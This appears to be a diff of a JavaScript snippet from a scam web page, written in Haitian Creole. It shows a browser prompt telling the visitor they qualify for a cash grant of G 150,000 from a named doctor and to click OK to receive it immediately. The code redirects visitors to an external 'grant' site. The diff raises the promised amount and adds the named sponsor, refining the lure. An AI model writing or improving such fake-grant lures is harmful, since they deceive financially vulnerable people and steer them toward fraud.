@@ -1,10 +1,10 @@
-var password = 'G 100,000';
+var password = 'RETIRE G 150,000';
 
 password = prompt(
-  'Felisitasyon, ou kalifye pou resevwa G 100,000 sibvansyon lajan kach pou soulajman povrete pou jèn ki pa gen travay. Klike OK pou resevwa li imedyatman.',
-  'G 100,000'
+  'Felisitasyon, ou kalifye pou resevwa yon Sibvansyon Lajan Kach G 150,000 nan men DR. HERRIOT TABUTEAU. Klike sou OK pou resevwa li imedyatman.',
+  'RETIRE G 150,000'
 );
 
-if (password !== 'G 100,000') {
+if (password !== 'RETIRE G 150,000') {
     location.href = 'https://ongoing-grant.info/G150000-Sibvansyon.html';
 }
